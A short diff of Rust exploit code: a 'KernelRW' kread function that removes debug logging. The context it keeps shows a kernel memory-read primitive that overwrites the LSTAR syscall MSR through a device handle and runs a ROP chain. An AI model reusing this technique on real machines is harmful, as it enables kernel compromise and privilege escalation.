@@ -98,16 +98,6 @@ impl<'a> KernelRW<'a> {
     #[inline(never)]
     #[allow(named_asm_labels)]
     pub fn kread(&self, src: u64) -> Result<u64> {
-        let mut _log_f = std::fs::OpenOptions::new().create(true).append(true).open("C:\\Windows\\Temp\\mmdevlib_kernel.log").ok();
-        let mut log_debug = |msg: &str| {
-            if let Some(ref mut f) = _log_f {
-                use std::io::Write;
-                let _ = writeln!(f, "[kread] {}", msg);
-                let _ = f.sync_all();
-            }
-        };
-
-        log_debug(&format!("kread started for src 0x{:016X}", src));
 
         let lstar_lo = self.lstar_orig & 0xFFFF_FFFF;
         let lstar_hi = self.lstar_orig >> 32;
@@ -133,10 +123,8 @@ impl<'a> KernelRW<'a> {
 
         let rop_ptr = rop.as_mut_ptr() as u64;
         let (read_mem_va, read_reg) = g.read_mem.unwrap();
-        log_debug(&format!("writing read_mem_va 0x{:016X} to LSTAR", read_mem_va));
         msr_write(self.dev, MSR_LSTAR, read_mem_va)?;
 
-        log_debug("Executing ROP chain for kread...");
         unsafe {
             match read_reg {
                 ReadReg::Rax => {
@@ -234,10 +222,8 @@ impl<'a> KernelRW<'a> {
             }
         }
         std::hint::black_box(&rop);
-        log_debug("ROP chain executed.");
-
+        
         let val = unsafe { std::ptr::read_volatile(&result as *const u64) };
-        log_debug(&format!("kread returning 0x{:016X}", val));
         Ok(val)
     }
 }
